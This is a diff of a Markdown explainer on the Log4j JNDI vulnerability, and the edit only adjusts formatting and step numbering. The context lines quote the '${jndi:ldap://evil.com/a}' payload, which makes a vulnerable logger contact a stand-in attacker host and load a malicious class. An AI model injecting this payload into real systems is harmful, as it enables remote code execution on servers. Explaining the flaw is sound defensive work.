@@ -61,9 +61,10 @@ Log4j wouldn't treat this as text. It would interpret it and actually make a net
    ```bash
    ${jndi:ldap://evil.com/a}
    ```
-3. **Log4j interprets it**  
+3. **Log4j interprets it**
+   
    reaches out to attacker server through JNDI
 
-4. **Attacker responds with malicious class**
+5. **Attacker responds with malicious class**
    - Java loads and executes it
    - Full compromise
